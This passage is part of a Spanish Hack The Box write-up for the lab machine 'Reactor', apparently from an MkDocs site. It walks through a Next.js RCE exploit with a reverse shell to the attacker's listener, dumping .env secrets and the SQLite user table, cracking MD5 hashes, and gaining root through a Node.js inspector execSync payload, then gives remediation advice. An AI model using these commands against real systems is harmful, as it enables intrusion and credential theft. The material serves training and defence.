+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.venv
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">source</span><span class="w"> </span>.venv/bin/activate
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>pip<span class="w"> </span>install<span class="w"> </span>requests<span class="w"> </span>rich_click<span class="w"> </span>fake_useragent<span class="w"> </span>urllib3
+</code></pre></div>
+<p><strong>Verificación de vulnerabilidad:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://10.129.6.85:3000<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;id&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Success
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>uid=999(node) gid=988(node) groups=988(node)
+</code></pre></div>
+<p>Target confirmado como vulnerable.</p>
+<p><strong>Reverse Shell:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># El exploit maneja el listener internamente</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://10.129.6.85:3000<span class="w"> </span>-r<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.14.64<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-P<span class="w"> </span>nc-mkfifo
+</code></pre></div>
+<p><strong>Estabilización de la shell:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1"># Ctrl+Z</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div>
+<p><img alt="Shell as node" src="../screenshots/shell_node.png" /></p>
+<p><strong>Resultado:</strong> Shell interactiva como <code>node@reactor:/opt/reactor-app$</code></p>
+<h3 id="42-reconocimiento-post-explotacion">4.2 Reconocimiento Post-Explotación</h3>
+<p><strong>Archivos en <code>/opt/reactor-app</code>:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>app/  next.config.js  node_modules/  package.json  package-lock.json  reactor.db
+</code></pre></div></p>
+<p><strong>Credenciales en <code>.env</code>:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>cat<span class="w"> </span>/opt/reactor-app/.env
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>DB_PATH=/opt/reactor-app/reactor.db
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>NODE_ENV=production
+</code></pre></div>
+<p><strong>Base de datos SQLite — tabla users:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sqlite3<span class="w"> </span>/opt/reactor-app/reactor.db<span class="w"> </span>.tables
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># sensor_logs  users</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>sqlite3<span class="w"> </span>/opt/reactor-app/reactor.db<span class="w"> </span><span class="s2">&quot;SELECT * FROM users;&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+</code></pre></div>
+<h3 id="43-cracking-de-hashes-md5">4.3 Cracking de Hashes MD5</h3>
+<p>Los hashes están en formato MD5 sin salt — algoritmo débil, reversible con diccionario.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;a203b22191d744a4e70ada5c101b17b8&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>hashes.txt
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;39d97110eafe2a9a68639812cd271e8e&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>hashes.txt
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+</code></pre></div>
+<p><strong>Resultados:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Usuario</th>
+<th>Hash MD5</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>a203b22191d744a4e70ada5c101b17b8</td>
+<td>no encontrada en rockyou</td>
+</tr>
+<tr>
+<td>engineer</td>
+<td>39d97110eafe2a9a68639812cd271e8e</td>
+<td><strong>reactor1</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="44-acceso-ssh-como-engineer">4.4 Acceso SSH como engineer</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ssh<span class="w"> </span>engineer@10.129.6.85
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="c1"># Password: reactor1</span>
+</code></pre></div>
+<p><img alt="User flag via SSH" src="../screenshots/user_flag_ssh.png" /></p>
+<hr />
+<h2 id="5-post-exploitation">5. Post-Exploitation</h2>
+<h3 id="51-user-flag">5.1 User Flag</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>cat<span class="w"> </span>~/user.txt
+</code></pre></div>
+<p><strong>User flag:</strong> <code>1e9def6350d85a4e1bf21cb611c1034b</code></p>
+<hr />
+<h2 id="6-privilege-escalation-nodejs-inspector-abuse">6. Privilege Escalation — Node.js Inspector Abuse</h2>
+<h3 id="61-enumeracion-de-privilegios">6.1 Enumeración de Privilegios</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo<span class="w"> </span>-l
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># Sorry, user engineer may not run sudo on reactor.</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Binarios SUID estándar, nada explotable</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>id
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)</span>
+</code></pre></div>
+<p>Grupo <code>lxd</code> presente (vector alternativo via contenedor privilegiado), pero se descartó por falta de acceso a internet desde el target.</p>
+<h3 id="62-proceso-root-con-nodejs-inspector">6.2 Proceso root con Node.js Inspector</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>root
+</code></pre></div>
+<p>Proceso crítico encontrado:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>root  1399  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+</code></pre></div></p>
+<p><strong>Concepto:</strong> La flag <code>--inspect</code> activa el protocolo de debugging de Node.js (Chrome DevTools Protocol) en el puerto 9229. Esto abre un servidor WebSocket que acepta conexiones y permite ejecutar JavaScript arbitrario en el contexto del proceso — en este caso, <strong>root</strong>.</p>
+<p>Aunque está bindeado a <code>127.0.0.1</code> (no accesible externamente), cualquier usuario local puede conectarse.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">9229</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># LISTEN 0  511  127.0.0.1:9229  0.0.0.0:*</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://127.0.0.1:9229/json
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">[{</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0db0e9e7-efbd-4124-9d7e-cbbc59b1be42&quot;</span><span class="p">,</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">  </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/opt/uptime-monitor/worker.js&quot;</span><span class="p">,</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">  </span><span class="nt">&quot;webSocketDebuggerUrl&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ws://127.0.0.1:9229/0db0e9e7-efbd-4124-9d7e-cbbc59b1be42&quot;</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="p">}]</span>
+</code></pre></div>
+<h3 id="63-explotacion-del-inspector">6.3 Explotación del Inspector</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>node<span class="w"> </span>inspect<span class="w"> </span><span class="m">127</span>.0.0.1:9229
+</code></pre></div>
+<p>Una vez dentro del debugger, se ejecuta código JavaScript en el contexto del proceso root:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nx">exec</span><span class="p">(</span><span class="s2">&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /root/root.txt&#39;).toString()&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>Desglose del payload:</strong>
+- <code>exec(...)</code> — evalúa JS en el proceso objetivo (función del debugger)
+- <code>process.mainModule.require('child_process')</code> — importa el módulo nativo para ejecutar comandos shell; <code>require</code> directo no funciona en el debugger, pero <code>process.mainModule.require</code> sí porque accede al sistema de módulos del proceso original
+- <code>.execSync('cat /root/root.txt').toString()</code> — ejecuta el comando como root y devuelve el output</p>
+<p><strong>Resultado:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>&#39;3a22fec481c42917c8e1ab76594dd54c\n&#39;
+</code></pre></div></p>
+<h3 id="52-root-flag">5.2 Root Flag</h3>
+<p><strong>Root flag:</strong> <code>3a22fec481c42917c8e1ab76594dd54c</code></p>
+<hr />
+<h2 id="7-remediation">7. Remediation</h2>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Recommendation</th>
+<th>Priority</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-55182 Next.js RCE</td>
+<td>Actualizar Next.js a versión parcheada</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>Node.js <code>--inspect</code> como root</td>
+<td>Eliminar <code>--inspect</code> en producción; si es necesario, usar socket Unix con permisos restrictivos</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>Hashes MD5 sin salt</td>
+<td>Migrar a bcrypt/argon2 con salt único por usuario</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Credenciales en <code>.env</code></td>
+<td>Usar gestor de secretos (Vault, AWS Secrets Manager)</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Base de datos SQLite con usuarios expuesta</td>
+<td>Restringir permisos de lectura al proceso de la app únicamente</td>
+<td>Medium</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-lessons-learned">8. Lessons Learned</h2>
+<ul>
+<li><strong>Next.js versión en Wappalyzer</strong> → buscar CVEs antes de enumerar más. La versión exacta fue el vector principal.</li>
+<li>El inspector de Node.js (<code>--inspect</code>) en producción como proceso root es un vector de privesc poco conocido pero efectivo.</li>
+<li><code>ps aux | grep inspect</code> debería ser parte del checklist de privesc en Linux cuando hay Node.js presente.</li>
+<li>SQLite databases en aplicaciones web frecuentemente contienen credenciales — siempre revisar <code>.db</code> files.</li>
+<li>MD5 sin salt → hashcat con rockyou en segundos. Nunca usar MD5 para passwords.</li>
+</ul>
+<blockquote>
+<p><strong>OSCP note:</strong> Para detectar Node.js inspector como vector de privesc:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;\-\-inspect|\-\-inspect-brk&quot;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">9229</span>
+</code></pre></div>
+Si el proceso es root y el puerto está disponible localmente → <code>node inspect 127.0.0.1:9229</code> + <code>exec("process.mainModule.require('child_process').execSync('id').toString()")</code></p>
+</blockquote>
+<hr />
+<h2 id="9-references">9. References</h2>
+<ul>
+<li>CVE-2025-55182: Next.js React Server Components RCE via Prototype Pollution</li>
+<li>Node.js Inspector Security: https://nodejs.org/en/docs/guides/debugging-getting-started#security-implications</li>
+<li>HackTricks — Node.js Privilege Escalation via Inspector</li>
+<li>HTB Machine: Reactor</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Redeemer/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Redeemer">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Redeemer
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Principal/" class="md-footer__link md-footer__link--next" aria-label="Next: Principal">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Principal
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "search.highlight", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
